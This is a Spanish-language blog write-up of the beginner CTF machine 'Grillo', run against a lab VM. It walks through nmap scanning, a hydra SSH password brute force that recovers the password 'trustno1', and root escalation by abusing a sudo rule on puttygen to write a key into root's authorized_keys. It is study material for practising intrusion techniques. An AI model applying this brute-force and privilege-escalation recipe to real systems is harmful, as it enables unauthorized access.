---
title: "Writeup [Grillo] - The Hackers Labs"
date: 2024-05-10 14:00:00 +0200
categories: [Blog, writeups]
tags: [CTF, Writeups, Thehackerslabs]
image: /img/posts/CTF/grillo/grillo.png
---

## Introducción
Hoy vamos a realizar la máquina CTF **Grillo**. Esta es una breve descripción de lo que podemos esperar:

- **Nivel de Dificultad**: Es una máquina de **Nivel principiante**.
- **Creadores**: Creada por **CuriosidadesDeHackers** y **Condor**. Más información sobre la máquina está disponible en <a href="https://thehackerslabs.com/grillo/" target="_blank">The Hacker's Labs</a>.
- **Sistema Operativo**: S.O Linux.

<a href="/img/posts/CTF/grillo/grillo.png" target="_blank">
    <img src="/img/posts/CTF/grillo/grillo.png" alt="CTF Grillo" style="width: 50%;">
</a>

# Información Inicial
Descargamos la máquina y la dejamos ejecutándose en VirtualBox. 

<a href="/img/posts/CTF/grillo/vboxgrillo.png" target="_blank">
    <img src="/img/posts/CTF/grillo/vboxgrillo.png" alt="VirtualBox CTF Grillo" style="width: 85%;">
</a>



Parece ser un sistema operativo Linux, desde el cual obtenemos la dirección IP **192.168.10.129**. En la red 192.168.10.0/24, donde estamos realizando este laboratorio, solo hay tres equipos conectados. Vamos a confirmar que la información obtenida es real.


### Verificación de Puertos Abiertos

Para comenzar a identificar posibles vulnerabilidades, utilizamos `nmap`, una herramienta poderosa para el descubrimiento de redes y la auditoría de seguridad. A continuación, realizamos un escaneo completo para ver qué puertos están abiertos:

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv 192.168.10.129 -oG grillo
```
- **(-p-)**: Configura nmap para escanear todos los puertos
- **(--open)**: Mostrando solo aquellos que están abiertos 
- **(-sS )**: Utilizamos un escaneo SYN stealth (-), que es menos propenso a ser detectado por sistemas de seguridad porque no completa la conexión TCP
- **(--min-rate 5000)**: Acelera el escaneo enviando paquetes a una velocidad mínima de 5000 por segundo
- **(-vvv)**: Aumenta la verbosidad para mostrarnos más detalles sobre el escaneo ,
- **(-oG fichero)**: Se utiliza para especificar que los resultados del escaneo deben ser guardados en un formato específico conocido como `grepable`.


Resultados del Escaneo


```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN (https://nmap.org) at 2024-05-10 13:12 EDT
Initiating ARP Ping Scan at 13:12
Scanning 192.168.10.129 [1 port]
Completed ARP Ping Scan at 13:12, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:12
Scanning 192.168.10.129 [65535 ports]
Discovered open port 22/tcp on 192.168.10.129
Discovered open port 80/tcp on 192.168.10.129
Completed SYN Stealth Scan at 13:12, 5.35s elapsed (65535 total ports)
Nmap scan report for 192.168.10.129
Host is up, received arp-response (0.0021s latency).
Scanned at 2024-05-10 13:12:02 EDT for 5s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

```

Observamos que tiene los puertos 22 y 80 abiertos, que corresponden al servicio SSH y al servidor web Apache respectivamente. Estos puertos serán el foco de nuestros análisis posteriores.

### Análisis Detallado de Servicios
A continuación, realizamos un análisis más detallado para determinar las versiones de los servicios que se ejecutan en estos puertos:

```bash
❯ sudo nmap -p22,80 -sCV 192.168.10.129 -oG grillo-ports
```
- **(-p22,80-)**: Especificamos los puertos que queremos analizar 
- **(-sC)**: Realiza un escaneo utilizando scripts predeterminados de nmap.
- **(-sV)**: Intentará determinar qué aplicaciones y versiones están corriendo detrás de los puertos abiertos.

```bash
Starting Nmap 7.94SVN (https://nmap.org) at 2024-05-10 19:45 CEST
Nmap scan report for 192.168.10.129
Host is up (0.00060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 00:0C:29:27:F0:B4 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
```
Estos resultados confirman la versión del SSH y del servidor Apache, lo que es crucial para determinar la siguiente fase de nuestro análisis de seguridad.

### Conclusión
Hasta ahora hemos confirmado que la máquina es operada por `Linux` y hemos identificado dos servicios críticos `ssh & apache`. En los siguientes pasos, exploraremos en detalle estos servicios para identificar posibles vectores de ataque.

## Poniendo a Prueba a Grillo: Un Vistazo a sus Puertos y Servicios

Comenzamos accediendo mediante un navegador web al puerto 80, donde se encuentra hospedada una página típica de Apache2 Debian. A primera vista, parece un sitio estándar, pero un detalle en el pie de página revela un posible descuido: un comentario visible que sugiere un nombre de usuario de SSH, `melanie`.

<a href="/img/posts/CTF/grillo/apache-melanie.png" target="_blank">
    <img src="/img/posts/CTF/grillo/apache-melanie.png" alt="Pie de página de Apache con comentario revelador" style="width: 85%;">
</a>

### Fuerza Bruta
Para explorar esta pista, decidimos utilizar `hydra`, una herramienta especializada en ataques de fuerza bruta. Suponiendo que tenemos un posible nombre de usuario, ejecutamos el siguiente comando para intentar descifrar la contraseña:

```bash
❯ hydra 192.168.10.129 ssh -l melanie -P /usr/share/wordlists/rockyour.txt
```

- **(ssh)**: Indica que el ataque se realizará sobre el protocolo SSH.
- **(-l)**:  Especifica 'melanie' como el nombre de usuario a probar.
- **(-P rockyour.txt:)**: Dirección del fichero que contiene una lista de posibles 




```bash
┌──(kali㉿kali)-[~]
└─$ hydra 192.168.10.129 ssh -l melanie -P /usr/share/wordlists/rockyou.txt    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-11 03:33:26
WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.10.129:22/
[STATUS] 127.00 tries/min, 127 tries in 00:01h, 14344273 to do in 1882:28h, 15 active
[STATUS] 105.33 tries/min, 316 tries in 00:03h, 14344084 to do in 2269:39h, 15 active
[STATUS] 98.71 tries/min, 691 tries in 00:07h, 14343709 to do in 2421:46h, 15 active
[22][ssh] host: 192.168.10.129   login: melanie   password: trustno1
1 of 1 target successfully completed, 1 valid password found
```



Tras realizar un ataque de fuerza bruta con éxito, hemos obtenido lo que parece ser la contraseña del usuario Melanie **trustno1** para SSH. Este resultado es interesante, ya que podría darnos acceso al sistema para una exploración más profunda. El siguiente paso será comprobar este acceso y evaluar los permisos asociados para entender mejor las posibles vulnerabilidades.



### SSH

Tras obtener la contraseña, procedemos a acceder al sistema como el usuario Melanie. Utilizando SSH, nos conectamos al host objetivo:


```bash
❯ ssh melanie@192.168.10.129
melanie@192.168.10.129 password: 
Linux grillo 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat May 11 01:12:43 2024 from 192.168.10.128
melanie@grillo:~$ 
```

Una vez dentro del sistema, ejecutamos un comando `ls` para listar los archivos en el directorio home de Melanie, donde descubrimos un archivo llamado user.txt

```bash
melanie@grillo:~$ ls
user.txt
```

¡Hemos conseguido la primera bandera!

Este hallazgo es un importante hito en nuestra evaluación de seguridad, demostrando que las credenciales obtenidas nos proporcionan acceso significativo al sistema. 
Nuestra siguiente misión es conseguir la segunda bandera, esta vez buscando elevar nuestros privilegios al usuario root.

Este objetivo nos ayudará a profundizar aún más en el sistema y explorar métodos potenciales para escalar privilegios o descubrir vectores de ataque adicionales, que podrían permitirnos un control total sobre el host.

Realizamos un sudo -l y observamos que melanie, tiene privilegios para ejecutar puttygen.
```bash
melanie@grillo:~$ sudo -l
Matching Defaults entries for melanie on grillo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User melanie may run the following commands on grillo:
    (root) NOPASSWD: /usr/bin/puttygen
```

### Generación de Claves SSH

Primero, generamos un clave SSH utilizando `puttygen`, una herramienta para manejar claves SSH en varios formatos:

```bash
melanie@grillo:~$ puttygen -t rsa -o id_rsa -O private-openssh
+++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Enter passphrase to save key: 
Re-enter passphrase to verify:
```

Esto crea una nueva clave privada RSA, que se guarda en el archivo id_rsa. Nos solicita una frase de paso para añadir una capa adicional de seguridad a la clave privada.

Verificación de la Clave Generada
Tras generar la clave, utilizamos `ls` para verificar que el archivo id_rsa se ha creado correctamente:

```bash
melanie@grillo:~$ ls
id_rsa  user.txt
```

### Preparación de la Clave Pública
Con la clave privada generada, el siguiente paso es crear la clave pública correspondiente y añadirla al archivo authorized_keys del usuario root, permitiendo un acceso SSH sin contraseña desde la cuenta de Melanie:

```bash
melanie@grillo:~$ sudo -u root /usr/bin/puttygen id_rsa -o /root/.ssh/authorized_keys -O public-openssh
Enter passphrase to load key:
```

### Ajuste de Permisos y Acceso SSH
Antes de intentar acceder mediante SSH, ajustamos los permisos de la clave privada para asegurar que solo el usuario pueda leerla:

```bash
melanie@grillo:~$ chmod 600 id_rsa
```

### Finalmente, utilizamos la clave privada para iniciar sesión como root en el servidor:

```bash
melanie@grillo:~$ ssh -i id_rsa root@192.168.10.129
Enter passphrase for key 'id_rsa':
Linux grillo 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 14 00:13:55 2024 from 192.168.10.129
root@grillo:~# 
root@grillo:~# ls
root.txt
```

Hemos accedido como root! Y si realizamos un ls, comprobamos que en el home de root, tenemos la segunda bandera.

Reto conseguido!